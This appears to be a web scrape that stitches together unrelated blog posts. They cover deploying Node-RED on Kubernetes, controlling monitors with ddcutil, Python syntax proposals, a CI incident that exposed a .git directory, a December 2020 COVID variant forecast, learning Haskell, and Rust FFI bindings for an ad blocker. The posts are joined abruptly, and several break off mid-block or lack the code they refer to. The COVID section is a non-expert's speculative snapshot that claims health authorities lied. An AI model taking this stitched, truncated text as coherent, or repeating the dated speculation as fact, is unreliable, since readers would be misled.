<h2>Catalogue</h2>



<p>In the Docker-Compose version the custom node `catalogue.json` file is hosted by the management application and had to be manually updated each time a new or updated node was push to the repository. For this version I’ve stood up a separate container.</p>



<p>This container runs a small web app that has 2 endpoints.</p>



<ul><li><code>/catalogue.json</code> – which returns the current version of the catalogue</li><li><code>/update</code> – which is triggered by the the notify function of the Verdaccio private npm registry</li></ul>



<p>The registry has this snippet added to the end of the <code>config.yml</code></p>


<pre title="">notify:
  method: POST
  headers: [{'Content-Type': 'application/json'}]
  endpoint: http://catalogue/update
  content: '{"name": "{{name}}", "versions": "{{versions}}", "dist-tags": "{{dist-tags}}"}'
</pre>


<p>The code for this container can be found <a href="https://github.com/hardillb/node-red-private-catalogue-builder">here</a>. </p>



<h2>Deploying</h2>



<p>First clone the project from github</p>


<pre title="">$ github clone https://github.com/hardillb/multi-tenant-node-red-k8s.git
</pre>


<p>Then run the <code>setup.sh</code> script, passing in the base domain for instances and the host:port combination for the local container registry.</p>


<pre title="">$ ./setup.sh example.com private.example.com:5000
</pre>


<p>This will update some of the container locations in the deployment and build the secrets needed to access the Kubernetes API (reads the content of <code>~/.kube/config</code>)</p>



<p>With all the configuration files updated the containers need building and pushing to the local container registry.</p>


<pre title="">$ docker build ./manager -t private.example.com:5000/k8s-manager
$ docker push private.example.com:5000/k8s-manager
$ docker build ./catalogue -t private.example.com:5000/catalogue
$ docker push private.example.com:5000/catalogue
$ docker build ./custom-node-red -t private.example.com:5000/custom-node-red
$ docker push private.example.com:5000/custom-node-red
</pre>


<p>Finally trigger the actual deployment with <code>kubectl</code></p>


<pre title="">$ kubectl apply -f ./deployment
</pre>


<p>Once up and running the management app should be available on <code>http://manager.example.com</code>, the private npm registry on <code>http://registry.example.com</code> and an instance called “r1” would be on <code>http://r1.example.com</code>.</p>



<p>A wildcard DNS entry needs to be setup to point all <code>*.example.com</code> hosts to the Kubernetes clusters Ingress IP addresses.</p>



<p>As usual the whole solution can be found on github <a href="https://github.com/hardillb/multi-tenant-node-red-k8s">here</a>.</p>



<h2>What’s Next</h2>



<p>I need to work out how to set up Avahi CNAME entries for each deployment as I had working with both <a href="https://www.hardill.me.uk/wordpress/2020/09/22/nginx-proxy-avahi-helper/" data-type="post" data-id="4040">nginx</a> and <a href="https://www.hardill.me.uk/wordpress/2020/10/05/traefik-avahi-helper/" data-type="post" data-id="4107">traefik</a> so I can run it all nicely on my LAN without having to mess with <code>/etc/hosts</code> or the local DNS. This should be possible by using a <code>watch</code> call one the Kubernetes Ingress endpoint.</p>



<p>I also need to back port the new catalogue handling to the docker-compose version.</p>



<p>And finally I want to have a look at generating a Helm chart for all this to help get rid of needing the <code>setup.sh</code> script to modify the deployment YAML files.</p>



<p>p.s. If anybody is looking for somebody to do this sort of thing for them drop me a <a href="https://www.hardill.me.uk/wordpress/about/curriculum-vitae/" data-type="URL" data-id="https://www.hardill.me.uk/wordpress/about/curriculum-vitae/">line</a>.</p>

            <section>
                <div>
                    <!--kg-card-begin: markdown--><p>DDC/CI is a protocol for controlling monitor features like brightness, contrast, color temperature, input source, ... over the display cable (VGA, DVI, HDMI, Display port, ...).</p>
<p>It's a quite old protocol that is well supported across many different devices.</p>
<p>I'm currently using it to:</p>
<ul>
<li>Adjust brightness of my two monitors depending on how the room is lighted</li>
<li>Switch monitor inputs between the VM-dedicated graphics card and the host graphics card, replacing the need of a very expensive KVM switch that can WQHD @144Hz.</li>
</ul>

<h2 id="requiredpackages">Required packages</h2>
<p>You must install <code>ddcutil</code> package. The <a href="http://www.ddcutil.com/">official website</a> contains extensive information for troubleshooting.</p>
<h2 id="kernelmodules">Kernel modules</h2>
<p>Ddcutil connects to your screen over an I2C connection, and requires the <code>i2c-dev</code> kernel module to be loaded.</p>
<p>You can load the module at runtime using <code>sudo modprobe i2c-dev</code>.</p>
<p>To make it persistent across reboots, you need to add the module to <code>/etc/modules-load.d/i2c-dev.conf</code>:</p>
<pre><code>i2c-dev
</code></pre>
<p>Once the module is loaded, you should see some files in <code>/dev/i2c-*</code>.</p>
<h2 id="allowtheusertouseddc">Allow the user to use DDC</h2>
<p>By default the i2c dev files are owned by root, and can't be used by other users. One solution to allow your user to control DDC without using sudo is to add a custom udev rule:</p>
<p><code>/etc/udev/rules.d/45-ddcutil-i2c.rules</code></p>
<pre><code>KERNEL=="i2c-[0-9]*", GROUP="your-user", MODE="0660", PROGRAM="/usr/bin/ddcutil --bus=%n getvcp 0x10"
</code></pre>
<p>This rule automatically detects which i2c devices are DDC-capable, and allows members of the group "your-user" to control the file.</p>
<p>You can reload udev rules without rebooting by executing <code>sudo udevadm trigger</code></p>
<p>If you have multiple users, you can create a new group and add your user to the group:</p>
<pre><code>groupadd ddc
usermod -aG ddc $USER
</code></pre>
<h2 id="identifyyourmonitorinfo">Identify your monitor info</h2>
<h3 id="howtoaddressyourmonitor">How to address your monitor</h3>
<p>There are multiple ways to address your monitor, like display number (<code>--display</code>), model name (<code>--model</code>), serial number (<code>--sn</code>), i2c bus ID (<code>--bus</code>).</p>
<p>The bus ID method is way faster than the others, but may be unreliable if your hardware changes often.</p>
<pre><code>ddcutil detect

            <p>The language has been literally 'evolving' since the version
that many of us have begun (maybe since the initial day, if you
are Guido). I'm not talking about any features in specific,
but rather the whole language. If you compare a code fragment
that you wrote 5 years ago, with the 'refactored' version that
you would write if it were today the difference is obvious. </p>
<p>We've seen a lot of new syntax popping into our lives, in just the

<p>This huge list contains some of the (major~) changes that have been implemented since 3.5, there
are also quite a few minor ones (like <code>_</code> separator for numbers, <code>1_000_00</code> or <a href="https://www.python.org/dev/peps/pep-0530/">PEP 530</a>
for async comprehensions or even a new one for 3.9 to extend the decorator syntax, <a href="https://www.python.org/dev/peps/pep-0614/">PEP 614</a>.)</p>
<p>Well, since we all refreshed our memories, let's try to imagine a world where these features don't exist. Imagine
not having access to f-strings, writing weird stuff to deal with your coroutines, or repeating yourself 2 times whenever
you want to read chunks from a file, writing utility functions to merge 2 mappings and more awful cases. Except for maybe
PEP 465 (I never needed it, probably because I don't do scientific programming. But from what I saw by looking at the examples
in the PEP, it is quite good for people who work with data on a daily basis.) every feature in that list literally changed and
actively affected how I write my Python code, right now.</p>
<p>Seems like syntactical additions sounds great, why don't we add everything to the language? Let's start with
adding regex literals, and then move forward to call pipeline operator, blah blah blah. If you are subscribed
to the Python-ideas, then get ready to see tons of different, redundant new syntax proposals (even I, probably
proposed a couple of very obscure and stupid ideas in the past). Though this brings me back to the point of,
whether we should stop the syntactical growth at all or not. </p>
<p>In the last 6 month, 3 different major syntax changes were proposed. I guess everyone is somewhat familiar
with the pattern matching PEPs, PEP 622 (PEP 634, PEP 635, PEP 636). Also, there is PEP 637 for allowing keyword arguments
on the subscript syntax <code>[x=y, z=q]</code> and PEP 638, for syntactic macros. I am not going to criticize any of these PEPs, but
I'd like to ask you to think about them. Think of how they could affect you in 5 years. Think about whether your
coding styles would change because of them, think about how good fit they are to the language, and most importantly think about
whether you 'ACTUALLY' need them. Is there any 'ESSENTIAL' case that would be much better when you pass keyword arguments through
slices instead of just making a call to some sort of <code>get()</code> function? Or can't we have syntactical customization without having an
official definition of it? Does the syntax for 'patterns' (described by PEP 634) is a good fit for the Python language?</p>
<p>There are a lot of blog posts, <a href="https://discuss.python.org/t/gauging-sentiment-on-pattern-matching/5770">poll</a>s and maybe
hundreds of emails out there related to these proposals. I won't expect anyone to read them all, but if you want to get a 
general idea just check some of them out.</p>
<p>Have to say that, I'm extremely overwhelmed by seeing this amount of change proposals every day, in various
places. No one is forcing me to read them, though it is just a burden that I am intentionally or unintentionally taking to see what are people looking for in the language that I (myself) probably will be stuck
with for the next decade. Trying to comprehend what people are aiming with making language so complex with
growing the syntax more and more every day.</p>
<p>Don't forget that adding syntax is much more serious than adding a functionality to the runtime. That syntax
will be the face of the language, and you won't be able to alter it even a little bit. We all saw what happened
when the syntax was changed in a backwards-incompatible manner, and no one wants to go through that again. This
is why I am just asking you to think about whether do you believe these would be good fits for the language, whether
they will worth to their imponderable cost. </p>
<p>This is just me, throwing a bunch of questions into the void. If you want to talk more about these, feel free to
send me an email (batuhan [at] python [dot] org) or reach me through twitter (open DM for all, @isidentical).</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>Yesterday, this site went down for about four hours. Complaints started rolling
in from my millions of ardent followers, spurring me into action. Join
me as I deconstruct what went wrong, how I fixed it, and how I tried to
prevent the problem from occurring again.</p>

<p>This site is built with <a href="https://gohugo.io/">Hugo</a>, a static site generator
written in Go.
It<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> uses a slightly modified version of the
<a href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme by
<a href="https://github.com/LordMathis">Matúš Námešný</a>.
It’s deployed automatically using GitLab’s CI/CD (Continuous
Integration/Continuous Deployment) service. Every time I push a commit to the
remote repository, a server runs a deployment script that I wrote. The script
generates the site and then uploads it to my web host.</p>
<p>Since I got the flow working, I didn’t have any problems until now.</p>

<p>Yesterday at 8:22pm, I pushed a benign commit to the remote repository.
The commit in question simply removed a draft of a post I had been writing
and decided not to publish. As with all pushed commits, this triggered a
build and push of the site.</p>
<p>Hours later, I went to my site for something and noticed something strange:
the homepage was 404ing. So were all the other pages that should have
been there. So I looked through my CI logs and found that:</p>
<ol>
<li>Hugo had failed to build my site</li>
<li>My script attempted to upload anyway</li>
<li><em>It uploaded my <code>.git</code> directory</em></li>
</ol>
<p>The first one is okay; failures happen even though ideally they wouldn’t.
The second one is worrying: Why would that happen?
The third one had the potential to be disastrous.</p>
<h2 id="the-consequences">The consequences</h2>
<p>Luckily for me, there were few consequences. To my knowledge, my site gets very
few visitors. Also, it’s not like my site runs important tools or services for me,
since it’s a static site.</p>
<p>However, there is one thing that could have been very bad…</p>
<h2 id="the-potential-consequences">The potential consequences</h2>
<p>As I mentioned above, for those four hours, my entire <code>.git</code> directory for the
repository that holds this site was available for all to browse at
<a href="https://reeshill.net/.git/">https://reeshill.net/.git/</a>. This of course means that not only was the current
state of the repository publicly accessible, all past version history was as well.</p>
<p>My CI script needs to authenticate with my web host to upload the generated site.
It does this with an app-specific password. For the script, this password needs
to be stored somewhere the CI server will have access to.
The naïve solution would be to hard-code the password into the script that runs
on CI. If I had done this, <em>even if I had later removed it</em>, the password would
exist in the history of the repository. Had this been the case, an attacker
would have had plenty of time to discover this in the version history and upload
malicious content to my web host, such as a Javascript cryptocurrency miner.</p>
<p>Fortunately, Past Me was smart enough not to put any secrets in version control.
The password is actually stored by GitLab and given to the CI server as an
environment variable. I trust GitLab a lot more than I trust myself to keep my
secrets safe.</p>

<p>Two big things went wrong at once to cause this failure. If either of them had
gone right, the damage would have been either nonexistent or extremely minimal.
But because they both managed to fail at once, the consequences were greater.</p>

<p>The immediate cause of failure was that Hugo installation started failing.
I was using a Docker image of Alpine Linux that contained
<a href="https://en.wikipedia.org/wiki/Lftp"><code>lftp</code></a>, which I use as an FTP client.
However, that image did not contain Hugo, and when I set it up I was afraid to
mess with it, so CI would install Hugo from the network every time it was run.
Something must have changed in the Alpine repositories, because suddenly
running <code>hugo</code> resulted in the error</p>
<pre><code>Error relocating /usr/bin/hugo: _ZNSt7__cxx1118basic_stringstreamIcSt11char_traitsIcESaIcEEC1Ev: symbol not found
</code></pre>
<p>This should have been no big deal. The CI should have failed and then I would
deal with fixing the Hugo installation. But because of problem #2, the whole
situation spiraled out of control.</p>
<h2 id="the-real-cause">The real cause</h2>
<p>When I wrote the script that builds and uploads the site in April 2018, I did not
yet understand how shell scripting works. Crucially, I didn’t understand exit
codes. When you run a shell command, part of the result is an exit code: a
number which is <code>0</code> if the command was successful and some other value if it
failed.</p>
<p>By default, a script that contains a sequence of commands will run all of those
commands in order, even if one or more command fails. For an example, see the
following script:</p>
<div><pre><code data-lang="shell"><span>#!/bin/sh
</span><span></span>
<span>echo</span> <span>'Started the script!'</span>
ls directory-that-does-not-exist
<span>echo</span> <span>'The exit code of the previous command was'</span> <span>"</span><span>$?</span><span>"</span>
</code></pre></div><p>The second command (the <code>ls</code>) will fail if the named directory does not exist.
But the script will keep running. Here’s the output from running the above script:</p>
<pre><code>$ ./steamroll.sh 
Started the script!
ls: directory-that-does-not-exist: No such file or directory
The exit code of the previous command was 1
</code></pre><p>The second <code>echo</code> runs despite the previous command failing with a nonzero
exit code.</p>
<p>That’s kind of scary! In most programming languages, if the program encounters
an error, it will crash or display some sort of exception that halts execution.
Because the default shell behavior is to keep going regardless of failure status,
my script failed to generate the site but proceeded to the next step anyway.</p>
<p>In my case, when <code>lftp</code> was unable to upload the directory it was supposed to
upload (which was a child of the current directory), it instead uploaded the
current directory, which was the repository root. That looked like this:</p>
<pre><code>/builds/jarhill0/homepage/public: No such file or directory
Transferring file `README.md'
Transferring file `ci-upload.sh'
Transferring file `config.toml'
Making directory `.git'
Transferring file `.git/FETCH_HEAD'
Transferring file `.git/HEAD'
[etc.]
</code></pre><p>Ultimately, the failure of my script to halt once a command failed was what led
to the incident. Small failures should be expected, but when they happen there
should be a clear indication of failure and the process should not continue.</p>

<p>There were essentially three problems I had to fix:</p>
<ol>
<li>My site was down</li>
<li>My builds weren’t failing</li>
<li>My builds <em>were</em> failing</li>
</ol>
<h2 id="the-quick-fix">The quick fix</h2>
<p>Since I was still able to build my website on my local machine, I did that and
uploaded it. That gave me time to fix the underlying problems.</p>
<h2 id="the-process-fix">The process fix</h2>
<p>If one of my builds didn’t succeed, that should be reflected in the script’s
exit status.</p>
<p>It took six characters to fix my script:</p>
<p>Adding this line towards the top of the script does the following, according
to the <a href="http://www.linuxcommand.org/lc3_man_pages/seth.html">man page for <code>set</code></a>:</p>
<pre><code>-e  Exit immediately if a command exits with a non-zero status.
</code></pre><p>That’s <em>exactly</em> what we want! As soon as a command fails, the script should
fail. With this option set, any failures that may occur down the road will
stop the CI job with a failure status. Perfect!</p>
<p>Here’s what it looks like in our test script from above:</p>
<div><pre><code data-lang="shell"><span>#!/bin/sh
</span><span></span>
<span>set</span> -e

<span>echo</span> <span>'Started the script!'</span>
ls directory-that-does-not-exist
<span>echo</span> <span>'The exit code of the previous command was'</span> <span>"</span><span>$?</span><span>"</span>
</code></pre></div><p>And the output:</p>
<pre><code>$ ./stopsign.sh 
Started the script!
ls: directory-that-does-not-exist: No such file or directory
</code></pre><p>It stopped once there was an error. Sweet!</p>
<h2 id="the-build-fix">The build fix</h2>
<p>Now that my build status was properly reflecting the failure that was occuring,
I needed to make the builds succeed.</p>
<p>A quick search didn’t help me figure out what was causing the mis-installation
of Hugo, and I didn’t feel like digging in further because I knew that I was
misusing Docker.
The whole point of Docker is that it leads to reproducible states.
Instead of installing a new dependency on top of my Docker image every time,
I should put all necessary
dependencies in the image from the beginning. So I bit the bullet and figured
out how to make (actually, adapt) a Dockerfile. Now, all of my CI builds will
start with Hugo and <code>lftp</code> already installed.
It didn’t take all that long, and now I have removed one more source of failure!</p>

<p>Some failures, like the bug in my script fixed by <code>set -e</code>, can lie dormant for
quite a while
(in my case, a year and a half) before being exposed when something else fails.
When something works reliably for a while, we don’t often think to go back
and check that it works as we expect it does. And it’s very difficult to get
everything right the first time.</p>
<p>I’m glad that this failure led to an improvement in the way I use Docker images.
And I’m glad that the script has been fixed, because now any other failures
will be caught and I will be alerted. Above all, I’m glad that things were
configured well enough in the beginning that nothing bad happened to my site.</p>

<p>There is evidence of a new highly-infectious strain of COVID-19 emerging in the UK and other countries. This post is an elaboration of my current model of it, as promised in my <a rel="noreferrer noopener" href="https://putanumonit.com/2020/12/26/lesswrong-2018-epistemology/" target="_blank">review of LessWrong’s collection on <em>Epistemology</em></a>. Most of the information I have on this new COVID variant comes from <a rel="noreferrer noopener" href="https://www.lesswrong.com/posts/CHtwDXy63BsLkQx4n/covid-12-24-we-re-f-ed-it-s-over" target="_blank">this post by Zvi</a>, the links from it, and comments. Read those if you haven’t yet.</p>



<p>Though I usually strive to have timeless content on my blog, I’m making another COVID exception. Ten months ago I write <em><a rel="noreferrer noopener" href="https://putanumonit.com/2020/02/27/seeing-the-smoke/" target="_blank">Seeing The Smoke</a></em> and dozens of people told me it flipped the switch for them and let them prepare for COVID in time; this post may end up even timelier. I anticipate both my model and the evidence that feeds into it to change rapidly, everything below is a snapshot of what I believe as of Christmas Day 2020. Reminder: I am not an expert on any of this, just the Putanumonit guy putting a num on it.</p>



<hr>



<p>The median prediction on <a rel="noreferrer noopener" href="https://www.lesswrong.com/posts/CHtwDXy63BsLkQx4n/covid-12-24-we-re-f-ed-it-s-over" target="_blank">Zvi’s LW post</a> is around 60% that the new variant is at least 50% more transmissible and same for there being a third COVID wave in the US:</p>

<p>I would add a few things without straying too far from the crowd’s wisdom. </p>



<p>First, I would revise the crowd’s estimate for the first question down for no other reason than that the poll came at the end of a post titled <em>We’re Fucked, It’s Over</em>. If ever there was going to be a framing effect pushing estimates upwards, this would be it. There are also <a rel="noreferrer noopener" href="https://twitter.com/CupOfjoe1986/status/1342386338717458432" target="_blank">more alternative explanations</a> for the information coming out of the UK than Zvi accounted for.</p>



<p>Instead of just saying that that there’s a 60% chance it has a 50% higher transmissibility, I would break it down something like this:</p>



<ul><li>35% that the new strain is a nothingburger.</li><li>30% that it’s <em>slightly </em>more transmissible, say with an effective reproduction rate (r<sub>t</sub>) 20% higher.</li><li>30% that it’s <em>significantly </em>more transmissible, e.g. 70% higher.</li><li>5% in the Captain Malcolm Reynolds probability bucket.</li></ul>



<p>I also believe it very likely that new variant is already present in the US, given that a dozen flights from London have landed in NYC just in the last week. Travel from the UK has been restricted on Christmas eve but the dust from the bolting horse has already settled by the barn door.</p>



<p>A variant that’s just 20% more infectious will still take over exponentially from the old variant resulting in a chart like the one we see.</p>

<p>Several people have tried to explain away the growth of the new variant as being due to things like catching a superspreader, but it doesn’t have to be one or the other. It could have r<sub>t</sub>=1.2 <em>and</em> catch a superspreader event to make it look like r<sub>t</sub>=1.5-1.7. This is why I am giving extra weight to the hypothesis of slightly higher transmissibility.</p>



<p>I also think there’s a <strong>huge </strong>difference between r<sub>tnew</sub>=1.2 and r<sub>tnew</sub>=1.7 (here I mean r<sub>t</sub> relative to the old strain given the same measures of containment) in terms of outcomes. </p>



<p>In the first case, to keep the virus suppressed (i.e. r&lt;1) we need to take measures that would have yielded r<sub>t</sub>=0.8 for the old strain. <a rel="noreferrer noopener" href="https://rt.live/us/NY" target="_blank">New York sustained that number</a> (albeit never dipping below 0.7) for two months running in the spring. Given that ~30% of the state has already been infected, that makes this all the more doable. Gyms and restaurants will close and people will grumble, but we’ll probably survive till the vaccine.</p>



<p>r<sub>tnew</sub>=1.7 is an entirely different case. Suppressing it would require the sort of lockdown that would yield r<sub>t</sub>=0.6 for the old strain, a number that <a rel="noreferrer noopener" href="https://rt.live/" target="_blank"><strong>has never been reached by any US state for any amount of time</strong></a>. I see no way in hell that Americans would agree to a lockdown <em>much stricter than any we’ve had so far,</em> especially after they’ve been promised that the worst is behind them.</p>



<p>Rural red tribers will not agree because Biden is in the White House. Urban blue tribers because containment in cities is much harder anyway. Young people will not agree because the virus harms them less than the lockdown. Dumb people will not agree because they will not understand the science and math and smart people, seeing that, will try to get infected early before the hospitals are overwhelmed.</p>



<p>No one will believe any of the “experts” at the CDC or WHO or Dr. Fauci because they have all repeatedly lied and tried to manipulate people and reversed their positions without admitting that they have. They all have <em>negative </em>credibility at this point with many Americans.</p>



<p>If the new virus is 1.7 times as infectious I believe that Americans will most likely simply give up on containment, the populace if not the government. We’ll have time to vaccinate the most vulnerable 10-20% of the population by April-May, at which point the majority of everyone else will get the new strain. </p>



<p>There is a small chance that the US will get its shit together vaccine-wise and beat the new strain in a race. <a rel="noreferrer noopener" href="https://twitter.com/yashkaf/status/1342569735884517379" target="_blank">Israel, for example</a>, has a simple system in place to vaccinate the vast majority of its 9-million strong population by the end of March. On this timetable, even a virus with r<sub>t</sub>=1.7 will not have time to explode before herd immunity kills it.</p>



<p>The same is not true of the US, which is currently projected to reach majority immunization no earlier than the late summer by refusing to do <a rel="noreferrer noopener" href="https://twitter.com/yashkaf/status/1342546177288527872" target="_blank">basic things to rush the process</a>.</p>



<p>And what’s the Captain Mal bucket?</p>



<figure><div>
<p><span><iframe width="900" height="507" src="https://www.youtube.com/embed/MnQaYGJ5oYs?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span></p>
</div></figure>



<p>The new variant being more virulent in addition to being more infectious. Another newer strain that’s even worse. Or, in a nightmare scenario, a highly-transmissible mutation that also renders the Pfizer and Moderna vaccines ineffective. </p>



<p>If COVID has taught us one thing, it’s that it’s all usually worse than we thought.</p>



<p>So the bottom line is that I currently estimate a 30-35% chance of us being truly fucked, in the sense of dozens of millions more Americans getting COVID in 2021 and hundreds of thousands more dead, along with local attempts at extreme lockdowns. I’m not going to speculate on the further implications of this for things like financial markets or the fabric of our civilization. I also anticipate that I’ll be revising these numbers in the next few days. </p>



<p>But rationalists are seeing the smoke again.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>Haskell is notoriously famous for having a steep learning curve. A situation that frustrates newcomers to the language, especially newcomers who are experienced developers using other programming languages.</p>

<p>It is not uncommon to see seasoned developers express their frustration by making the point that all of the other languages they have picked up, they have been able to get productive within a reasonable amount of time, but Haskell only manages to remain an impenetrable wall of Egyptian glyphs after the same period of time.</p>

<p>A reason often cited for Haskell’s steep learning curve is the fact that <em>“Haskell is different”</em>. The argument goes: Haskell is not all that difficult, it is just different, and because of this, it is unfamilair. But most of the time, when this argument is made, it is not mentioned how exactly Haskell is different.</p>

<p>Sure, there could be other reasons why learning Haskell may be considered difficult, but we think the <em>difference</em> argument is an interesting one worth exploring. This is exactly what this post is about. The idea is to do more than just mention that Haskell is different but to show how. The hope is that doing this, will prepare newcomers to the language, hence preventing Haskell’s difference from being a stumbling block to learning the language.</p>

<p>So in what ways is Haskell different?</p>

<!--end_excerpt-->

<h2 id="two-axes-of-difference-syntax-and-computation-model">Two Axes of Difference: Syntax and Computation Model</h2>

<p>There are two axes where Haskell is fundamentally different: <em>The syntax and the computation model</em>.</p>

<p>Haskell has a syntax that is different from languages most experienced developers are familiar with. Also, Haskell’s computation model is based on a different paradigm when compared with most mainstream languages. Understanding this will help in developing a better learning strategy.</p>

<p>Most mainstream programming languages inherit the C-like syntax and have imperative semantics. Haskell syntax is not derived from C, and it is not an imperative language, instead, it is a functional language.</p>

<p>This means a programmer who is experienced with an imperative language with a C-like syntax will find it easy to pick up another imperative language with C-like syntax. Attempting to pick up Haskell in such a similar fashion will be harder and if not aware of these differences, Haskell will feel needlessly hard.</p>

<h3 id="syntax-difference-haskell-is-not-a-c-like-language">Syntax Difference: Haskell is not a C-like language</h3>

<p>Most, if not all current mainstream programming languages have a syntax inspired or derived from C. To illustrate this, let’s take a coding problem from <a href="https://www.codewars.com/">Codewars</a> and see the solutions in the first top <a href="https://www.tiobe.com/tiobe-index/">5 programming languages</a> as rated by the Tiobe programming index, which at the moment of writing this post are: C, Java, Python, C++ and C#. <br></p>

<em>Problem Statement: Multiples of 3 or 5</em> <a href="https://www.codewars.com/kata/514b92a657cdc65150000006/">source</a></p>

<p>If we list all the natural numbers below 10 that are multiples of 3 or 5, we get 3, 5, 6, and 9. The sum of these multiples is 23.</p>

<p>Finish the solution so that it returns the sum of all the multiples of 3 or 5 below the number passed in.</p>

<p>Note: If the number is a multiple of both 3 and 5, only count it once. Also, if a number is negative, return 0(for languages that do have them)

<p>You see the pattern here? Even in Python, a language that uses whitespace instead of curly braces, the structure of the solutions are all similar. It is not then difficult to see how someone who is proficient in one of the languages can easily make sense of any of the other languages because the structure of their syntax are the same.</p>

<p>Note that some of these imperative languages above now have constructs that makes it possible to emulate functional syntax. For example iterations and operations usually performed via <code>for loops</code> can now be done using construncts like streams and lambdas. This only shows the influence of functional programming on mainstream imperative languages. Infact these functional style is often seen as unnatural to the original languages. The creator of Python, Guido van Rossum, shared a similar sentiment about functional programming style in Python:</p>

<blockquote>
  <p>Python probably has the reputation of supporting functional programming based on the inclusion of lambda, map, filter, and reduce in the language, but in my eyes these are just syntactic sugar, and not the fundamental building blocks that they are in functional languages.</p>

<p>Now let us see the solution in Haskell:</p>

<p>This looks very different from the previous solutions. The syntax is different and that is because Haskell’s syntax is not inspired by C. <strong>More importantly, this syntax is native to Haskell, and not just a style</strong>. This highlights how Haskell is different when it comes to the axis of syntax.</p>

<blockquote>
  <div><p>An analogy:
Imagine you understand British English, and you want to learn how to write American English. Such a task would be pretty straight forward since you can more or less apply the bulk of the knowledge you already have. What you will then need to learn consists of knowing where to tweak things like the grammar and spelling and idioms that are peculiar to American English. Now contrast that to learning how to write Russian. To do that successfully you will need to be able to set aside what you already know in English and be ready to pick up new grammar rules, new alphabets, new spellings, new idioms, etc.</p><p>
Learning yet another of the mainstream C-family like languages once you know one, is like learning how to speak American English if you already know any variant of English Languages. Learning Haskell on the other hand is similar to already knowing English but wanting to learn Russian. You have to appreciate and understand the fact that the process cannot be approached with a strategy that involves applying what you already know and tweaking one or two things here and there, it has to be approached with the intention to pick up a totally different set of rules about computation and programming. If you are not aware of this fact, then it would become easy to get frustrated and make statements like: I am a senior programmer and in my 10 years of programming I have been able to pick up a new language in 2 weeks tops! I can’t do that with Haskell, hence Haskell is impenetrable. Nope Haskell is not impenetrable, you have just been applying the wrong learning technique. Being aware of this is part of the first steps in learning Haskell successfully.</p></div>
</blockquote>

<h2 id="computation-model-difference-haskell-is-not-an-imperative-language">Computation Model Difference: Haskell is not an imperative language</h2>

<p>The other axis where Haskell is different is its computation model it is based on. This difference is not as obvious as the syntax difference but is a more important difference to appreciate.</p>

<p>Programming languages are based on <a href="https://en.wikipedia.org/wiki/Model_of_computation">Models of computation</a>. This is not difficult to appreciate, as programming languages can be seen as a mechanism to express computations.</p>

<p>The theory of computation and the different possible models have a rich mathematical and academic background, with sequential models, functional models, and concurrent models being the three broad categories.</p>

<p>Most mainstream programming languages are imperative in nature. This means their semantic is derived from the sequential model of computation. To be specific, most imperative languages are implementations of <a href="https://en.wikipedia.org/wiki/Random-access_machine">Random access machines</a>/<a href="https://en.wikipedia.org/wiki/Turing_machine">Turing machines</a>, which are just two examples of the sequential model of computation.</p>

<p>The essence of this model involves expressing computation as a sequential step that involves data mutation together with control structures that control how data is accessed and updated as part of the computation.</p>

<p>This model is the basis of the imperative programming paradigm.</p>

<p>Haskell on the other hand is not based on a sequential model of computation hence it is not an imperative programming language. Haskell is based on the functional model of computation. To be specific, Haskell is an implementation of the <a href="https://en.wikipedia.org/wiki/Lambda_calculus">Lambda calculus</a>, which is one example of a functional model of computation.</p>

<p>The essence of Lambda Calculus involves expressing computation based on function abstraction and application using variable binding and substitution. Haskell, at its core is nothing but an implementation of Lambda Calculus.</p>

<p>These computation models then dictate the mental model that would be required when working with a programming language based on them. A sequential model that involves data mutation requires a different model than a functional model that is an implementation of lambda calculus which requires function abstraction and application.</p>

<p>Hence this is why it is beneficial, especially for seasoned developers picking up Haskell to understand a bit of Lambda Calculus, not to the level required of a mathematician or a computer scientist, but enough to understand why Haskell is the way it is. If not for any other reason but the fact that it will help to appreciate what we mean by function in a mathematical sense and how that is …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<p>While trying to implement a long planned feature, an ad block in Angelfish, the Plasma Mobile webbrowser,
I was looking for a mostly complete and performant library that provides this functionality.</p>

<p>First I found libadblockplus, which is a C++ library providing the AdblockPlus core functionality.
Sounds great, right? Well, not quite. It includes it’s own v8 java script engine,
and since we are talking about a webbrowser with a QML interface here,
including a third java script engine and a second copy of v8 was absolutely not an option.
Even if this wasn’t a webbrowser,
running a java script engine as implementation detail of a library is at least … problematic.</p>

<p>The other option I found is <a href="https://github.com/brave/adblock-rust">adblock-rust</a>,
which is the built-in ad block of the Brave browser. As the name tells, it is written in Rust,
and I was originally looking for a C++ library. But it turned out this was not much of a problem,
since Rust features excellent C interoperability, just like C++.
Based on this common ground, bindings can be created to use Rust code from C++ (and the other way around if needed).</p>

<h2 id="approach-1">Approach 1</h2>
<p>My first approach was to use raw ffi. That means essentially building a C API featuring the typical C primitive types in rust,
and telling the rust compiler to represent structs in memory the same way that C would do.
Thanks to cbindgen, which automatically generates a header file with the information for the C compiler to know which fields a struct has and were they are,
we directly get something we can include in our C++ project.</p>

<p>The rust build system cargo is capable of running custom code at build time, and we can use that to run cbindgen on our rust code, by adding a file named <code>build.rs</code>:</p>
<pre><code>extern crate cbindgen;

use std::env;

fn main() {
    let crate_dir = env::var("CARGO_MANIFEST_DIR").unwrap();

    cbindgen::generate(&amp;crate_dir)
        .unwrap()
        .write_to_file("bindings.h");
}
</code></pre>

<p>Our core data structure for the ad block looks like this:</p>
<pre><code>#[repr(C)]
pub struct Adblock {
    blocker: *mut Engine,
}
</code></pre>
<p>It stores a pointer to the rust Engine type in a C compatible struct.
The struct can not be created directly from C / C++, since we don’t know anything about the Engine type there.</p>

<p>So we need a function on the rust side that creates and initializes the Engine for us and packs it into an <code>Adblock</code> struct.
Since the code in angelfish is doing a bit more than only that, the function takes two C string arguments, and returns a pointer to a mutable (non-const) Adblock object.</p>
<pre><code>#[no_mangle]
pub extern "C" fn new_adblock(
    list_dir: *const c_char,
    public_domain_suffix_file: *const c_char,
) -&gt; *mut Adblock
</code></pre>
<p>A few more thigs in this function signature are unusual, but they are all related to the FFI / C compatibility we need here:</p>
<ul>
  <li><code>#[no_mangle]</code> tells the rust compiler not to apply its rust specific function name mangling</li>
